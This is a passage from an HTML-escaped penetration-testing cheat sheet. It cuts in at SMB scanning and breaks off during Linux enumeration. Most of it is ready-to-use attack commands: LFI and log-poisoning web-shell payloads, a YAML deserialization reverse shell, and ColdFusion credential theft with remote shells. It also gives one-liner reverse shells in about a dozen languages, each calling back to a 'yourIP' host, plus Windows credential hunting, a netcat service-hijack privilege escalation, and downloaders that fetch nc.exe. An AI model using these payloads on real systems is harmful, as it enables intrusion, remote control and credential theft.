&lt;p&gt;&lt;code&gt;nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;search-for-smb-vulns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#search-for-smb-vulns&#34;&gt;#&lt;/a&gt; Search for SMB vulns&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nmap -p139,445 &amp;lt;target IP&amp;gt; --script smb-vuln*&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumerate-using-smb-null-session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumerate-using-smb-null-session&#34;&gt;#&lt;/a&gt; Enumerate using SMB (null session)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;enum4linux -a &amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumerate-using-smb-wuser-pass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumerate-using-smb-wuser-pass&#34;&gt;#&lt;/a&gt; Enumerate using SMB (w/user &amp;amp; pass)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;enum4linux -a -u &amp;lt;user&amp;gt; -p &amp;lt;passwd&amp;gt; &amp;lt;targetIP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;website-enumeration&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#website-enumeration&#34;&gt;#&lt;/a&gt; Website Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;quick-enumeration-using-wordlist&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-enumeration-using-wordlist&#34;&gt;#&lt;/a&gt; quick enumeration using wordlist&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;gobuster -u http://&amp;lt;target IP&amp;gt; -w /usr/share/dirb/wordlists/big.txt&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;enumeration-and-basic-vuln-scan-of-a-website&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumeration-and-basic-vuln-scan-of-a-website&#34;&gt;#&lt;/a&gt; enumeration and basic vuln scan of a website&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://&amp;lt;target IP&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;website-tips-and-tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#website-tips-and-tricks&#34;&gt;#&lt;/a&gt; Website tips and tricks&lt;/h2&gt;
&lt;h3 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/apply:os.system [&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/yourIP/4444 0&amp;gt;&amp;amp;1&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Check for LFI&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Add  &lt;code&gt;/etc/passwd%00&lt;/code&gt;  to any GET/POST arguments. On windows try  &lt;code&gt;C:\Windows\System32\drivers\etc\hosts%00&lt;/code&gt;  or  &lt;code&gt;C:\autoexec.bat%00&lt;/code&gt; .&lt;br /&gt;
A quick win could also be any of these files  &lt;code&gt;c:\sysprep.inf&lt;/code&gt; ,  &lt;code&gt;c:\sysprep\sysprep.xml&lt;/code&gt;  or  &lt;code&gt;c:\unattend.xml&lt;/code&gt;  as they would contain local admin credentials. On linux it&#39;s worth checking  &lt;code&gt;/proc/self/environ&lt;/code&gt;  to see if there are any credentials passed to the running process via env vars.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fetching .php files via LFI&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;/index.php?somevar=php://filter/read=convert.base64-encode/resource=&amp;lt;file path&amp;gt;%00&lt;/code&gt;  this will return base64 encoded PHP file. Good for fishing up  &lt;code&gt;config.php&lt;/code&gt;  or similar.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Abusing /proc/self/environ LFI to gain reverse shell&lt;br /&gt;
In some situations it&#39;s possible to abuse  &lt;code&gt;/proc/self/environ&lt;/code&gt;  to execute a command. For example:&lt;br /&gt;
 &lt;code&gt;index.php?somevar=/proc/self/environ&amp;amp;cmd=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;&amp;lt;your IP&amp;gt;&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache access.log + LFI = PHP injection&lt;br /&gt;
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;with netcat send a request like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;auth.log + LFI&lt;br /&gt;
 &lt;code&gt;ssh &amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;@targetIP&lt;/code&gt;  and then LFI  &lt;code&gt;/var/log/auth.log&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;/var/mail + LFI&lt;br /&gt;
 &lt;code&gt;mail -s &amp;quot;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;quot; someuser@targetIP &amp;lt; /dev/null&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php expect&lt;br /&gt;
 &lt;code&gt;index.php?somevar=expect://ls&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;php input&lt;br /&gt;
 &lt;code&gt;curl -X POST &amp;quot;targetIP/index.php?somevar=php://input&amp;quot; --data &#39;&amp;lt;?php system(&amp;quot;curl -o cmd.php yourIP/cmd.txt&amp;quot;);?&amp;gt;&#39;&lt;/code&gt; &lt;br /&gt;
Then access  &lt;code&gt;targetIP/cmd.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;coldfusion&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#coldfusion&#34;&gt;#&lt;/a&gt; ColdFusion&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;is it Enterprise or Community?&lt;br /&gt;
Check how it handles  &lt;code&gt;.jsp&lt;/code&gt;  files   &lt;code&gt;curl targetIP/blah/blah.jsp&lt;/code&gt; . If 404 - enterprise, 500 - community.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;which version?&lt;br /&gt;
 &lt;code&gt;/CFIDE/adminapi/base.cfc?wsdl&lt;/code&gt;  has a useful comment indicating exact version&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;common XEE&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHktYXNzZXNzbWVudC5jb20vZmlsZXMvYWR2aXNvcmllcy8yMDEwLTAyLTIyX011bHRpcGxlX0Fkb2JlX1Byb2R1Y3RzLVhNTF9FeHRlcm5hbF9FbnRpdHlfYW5kX1hNTF9JbmplY3Rpb24ucGRm&#34;&gt;https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LFI in admin login locale&lt;br /&gt;
 &lt;code&gt;/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties&lt;/code&gt;  - may need full path. They can be obtained with help of   &lt;code&gt;/CFIDE/componentutils/cfexplorer.cfc&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Local upload and execution&lt;br /&gt;
Once access to admin panel is gained it&#39;s possible to use the task scheduler to download a file and use a system probe to execute it.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Debugging &amp;amp; Logging&lt;/code&gt;  -&amp;gt;  &lt;code&gt;Scheduled Tasks&lt;/code&gt;  -&amp;gt; url=&lt;path to our executable&gt;, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.&lt;/p&gt;
&lt;p&gt;To execute it create a probe  &lt;code&gt;Debugging &amp;amp; Logging&lt;/code&gt;  -&amp;gt;  &lt;code&gt;System probes&lt;/code&gt;  -&amp;gt; URL=&lt;some URL&gt;, Probe fail - fail if probe does not contain &amp;quot;blahblah&amp;quot;, Execute program &lt;path to our downloaded exe&gt;. And then run probe manually.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Files worth grabbing&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CF7 \lib\neo-query.xml&lt;/li&gt;
&lt;li&gt;CF8 \lib\neo-datasource.xml&lt;/li&gt;
&lt;li&gt;CF9 \lib\neo-datasource.xml&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Simple remote CFM shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;cfexecute name = &amp;quot;#URL.runme#&amp;quot; arguments =
&amp;quot;#URL.args#&amp;quot; timeout = &amp;quot;20&amp;quot;&amp;gt;
&amp;lt;/cfexecute&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Simple remote shell using Java (if CFEXECUTE is disabled)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;cfset runtime = createObject(&amp;quot;java&amp;quot;,
&amp;quot;java.lang.System&amp;quot;)&amp;gt;
&amp;lt;cfset props = runtime.getProperties()&amp;gt;
&amp;lt;cfdump var=&amp;quot;#props#&amp;quot;&amp;gt;
&amp;lt;cfset env = runtime.getenv()&amp;gt;
&amp;lt;cfdump var=&amp;quot;#env#&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dir-busting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dir-busting&#34;&gt;#&lt;/a&gt; dir busting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;generic dirbusting&lt;br /&gt;
 &lt;code&gt;gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fuzz some cgi&lt;br /&gt;
 &lt;code&gt;gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;reverse-shell-howto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reverse-shell-howto&#34;&gt;#&lt;/a&gt; Reverse Shell Howto&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Bash&lt;br /&gt;
 &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/yourIP/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl Linux&lt;br /&gt;
 &lt;code&gt;perl -e &#39;use Socket;$i=&amp;quot;yourIP&amp;quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl Windows&lt;br /&gt;
 &lt;code&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&amp;quot;yourIP:4444&amp;quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python&lt;br /&gt;
 &lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;yourIP&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PHP&lt;br /&gt;
 &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;yourIP&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ruby&lt;br /&gt;
 &lt;code&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&amp;quot;yourIP&amp;quot;,4444).to_i;exec sprintf(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;quot;,f,f,f)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Java (Linux)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;r = Runtime.getRuntime()
p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/yourIP/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;] as String[])
p.waitFor()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Groovy&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;String host=&amp;quot;localhost&amp;quot;;
int port=8044;
String cmd=&amp;quot;cmd.exe&amp;quot;;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed())&amp;#123;while(pi.available()&amp;gt;0)so.write(pi.read());
while(pe.available()&amp;gt;0)so.write(pe.read());
while(si.available()&amp;gt;0)po.write(si.read());
so.flush();po.flush();
Thread.sleep(50);
try &amp;#123;p.exitValue();
break;
&amp;#125;catch (Exception e)&amp;#123;&amp;#125;&amp;#125;;
p.destroy();
s.close();

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;xterm&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;xterm -display yourIP:1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And on your side authorize the connection with  &lt;code&gt;xhost +targetIp&lt;/code&gt;  and catch it with  &lt;code&gt;Xnest :1&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;socat&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Listener:&lt;br /&gt;
 &lt;code&gt;socat file:`tty`,raw,echo=0 yourIP:4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;target:&lt;br /&gt;
 &lt;code&gt;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:yourIP:4444&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;interactive-shell-upgrade-tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#interactive-shell-upgrade-tricks&#34;&gt;#&lt;/a&gt; Interactive Shell Upgrade Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python (Linux)&lt;br /&gt;
 &lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python (Windows)&lt;br /&gt;
 &lt;code&gt;c:\python26\python.exe -c &#39;import pty; pty.spawn(&amp;quot;c:\\windows\\system32\\cmd.exe&amp;quot;)&#39; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Expect&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sh.exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/expect
spawn sh
interact
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Script&lt;br /&gt;
 &lt;code&gt;script /dev/null&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;inside-windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inside-windows&#34;&gt;#&lt;/a&gt; Inside Windows&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Get version&lt;br /&gt;
 &lt;code&gt;systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get users&lt;br /&gt;
 &lt;code&gt;net users&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get user info&lt;br /&gt;
 &lt;code&gt;net user &amp;lt;username&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)&lt;br /&gt;
 &lt;code&gt;netstat -ano&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Firewall status&lt;br /&gt;
 &lt;code&gt;netsh firewall show state&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;netsh firewall show config&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Scheduled tasks&lt;br /&gt;
List -  &lt;code&gt;schtasks /query /fo LIST /v&lt;/code&gt; &lt;br /&gt;
Create -  &lt;code&gt;schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR &amp;quot;mycommands&amp;quot;&lt;/code&gt; &lt;br /&gt;
Run -  &lt;code&gt;schtasks /Run /TN mytask&lt;/code&gt; &lt;br /&gt;
Delete -  &lt;code&gt;schtasks /Delete /TN mytask&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Running tasks&lt;br /&gt;
List -  &lt;code&gt;tasklist /SVC&lt;/code&gt; &lt;br /&gt;
Kill -  &lt;code&gt;taskkill /IM &amp;lt;exe name&amp;gt; /F&lt;/code&gt; &lt;br /&gt;
Kill -  &lt;code&gt;taskkill /PID &amp;lt;pid&amp;gt; /F&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Services&lt;br /&gt;
List -  &lt;code&gt;net start&lt;/code&gt; &lt;br /&gt;
Long name to key name  &lt;code&gt;sc getkeyname &amp;quot;long name&amp;quot;&lt;/code&gt; &lt;br /&gt;
Details -  &lt;code&gt;sc qc &amp;lt;key name&amp;gt;&lt;/code&gt; &lt;br /&gt;
Config -  &lt;code&gt;sc config &amp;lt;key name&amp;gt; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Low hanging fruits to grab&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Installers are running as elevated?&lt;br /&gt;
 &lt;code&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find interesting files&lt;br /&gt;
 &lt;code&gt;dir /s *pass* == *cred* == *vnc* == *.config*&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;findstr /si password *.xml *.ini *.txt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find interesting registry entries&lt;br /&gt;
 &lt;code&gt;reg query HKLM /f password /t REG_SZ /s&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query HKCU /f password /t REG_SZ /s&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Permissions&lt;br /&gt;
Check detail on service -  &lt;code&gt;accesschk.exe /accepteula -ucqv &amp;lt;service name&amp;gt;&lt;/code&gt; &lt;br /&gt;
Find modifiable services -  &lt;code&gt;accesschk.exe /accepteula -uwcqv &amp;quot;Authenticated Users&amp;quot; *&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;accesschk.exe /accepteula -uwcqv &amp;quot;Users&amp;quot; *&lt;/code&gt; &lt;br /&gt;
Folder permissions -  &lt;code&gt;accesschk.exe -dqv &amp;lt;path&amp;gt;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;cacls &amp;lt;path&amp;gt;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;icacls &amp;lt;path\file&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Qick win on WinXP SP0/1&lt;br /&gt;
 &lt;code&gt;sc config upnphost binpath= &amp;quot;C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;sc config upnphost obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;sc config upnphost depend= &amp;quot;&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;net stop upnphost&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;net start upnphost&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Quick wins&lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query&amp;quot; HKCU\Software\SimonTatham\PuTTY\Sessions&amp;quot;&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;reg query &amp;quot;HKCU\Software\ORL\WinVNC3\Password&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download file with VBS&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;dim xHttp: Set xHttp = createobject(&amp;quot;Microsoft.XMLHTTP&amp;quot;)
dim bStrm: Set bStrm = createobject(&amp;quot;Adodb.Stream&amp;quot;)
xHttp.Open &amp;quot;GET&amp;quot;, &amp;quot;http://yourIp/nc.exe&amp;quot;, False
xHttp.Send

with bStrm
    .type = 1 \&#39;//binary
    .open
    .write xHttp.responseBody
    .savetofile &amp;quot;C:\\Users\\Public\\nc.exe&amp;quot;, 2 \&#39;//overwrite
end with
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Download with Powershell 3+&lt;br /&gt;
 &lt;code&gt;powershell -NoLogo -Command &amp;quot;Invoke-WebRequest -Uri &#39;https://yourIP/nc.exe&#39; -OutFile &#39;c:\Users\Public\Downloads\nc.exe&#39;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download with Powershell 2&lt;br /&gt;
 &lt;code&gt;powershell -NoLogo -Command &amp;quot;$webClient = new-object System.Net.WebClient; $webClient.DownloadFile(&#39;https://yourIP/nc.exe&#39;, &#39;c:\Users\Public\Download\nc.exe&#39;)&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Download with Python&lt;br /&gt;
 &lt;code&gt;c:\Python26\python.exe -c &amp;quot;import urllib; a=open(&#39;nc.exe&#39;, &#39;wb&#39;); a.write(urllib.urlopen(&#39;http://yourIP/nc.exe&#39;).read()); a.flush();a.close()&amp;quot; &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows specific LPE vulns&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTExOTkv&#34;&gt;https://www.exploit-db.com/exploits/11199/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTgxNzYv&#34;&gt;https://www.exploit-db.com/exploits/18176/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTU2MDkv&#34;&gt;https://www.exploit-db.com/exploits/15609/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQyMjY5L2V4cGxvaXQ=&#34;&gt;https://www.securityfocus.com/bid/42269/exploit&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ2MTM2L2V4cGxvaXQ=&#34;&gt;https://www.securityfocus.com/bid/46136/exploit&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;inside-linux&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inside-linux&#34;&gt;#&lt;/a&gt; Inside Linux&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Basic enumeration&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;System info&lt;br /&gt;
 &lt;code&gt;uname -a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Arch&lt;br /&gt;
 &lt;code&gt;uname -m&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Kernel&lt;br /&gt;
 &lt;code&gt;cat /proc/version	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Distro&lt;br /&gt;
 &lt;code&gt;cat /etc/*-release&lt;/code&gt;  or  &lt;code&gt;cat /etc/issue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Filesystem&lt;br /&gt;
 &lt;code&gt;df -a	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Users&lt;br /&gt;
 &lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Groups&lt;br /&gt;
 &lt;code&gt;cat /etc/group&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Super accounts&lt;br /&gt;
 &lt;code&gt;grep -v -E &amp;quot;^#&amp;quot; /etc/passwd | awk -F: &#39;$3 == 0 &amp;#123; print $1&amp;#125;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Currently logged in&lt;br /&gt;
 &lt;code&gt;finger&lt;/code&gt; ,  &lt;code&gt;w&lt;/code&gt; ,  &lt;code&gt;who -a&lt;/code&gt; ,  &lt;code&gt;pinky&lt;/code&gt; ,  &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Last logged users&lt;br /&gt;
 &lt;code&gt;last&lt;/code&gt; ,  &lt;code&gt;lastlog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Cheeky test -&lt;br /&gt;
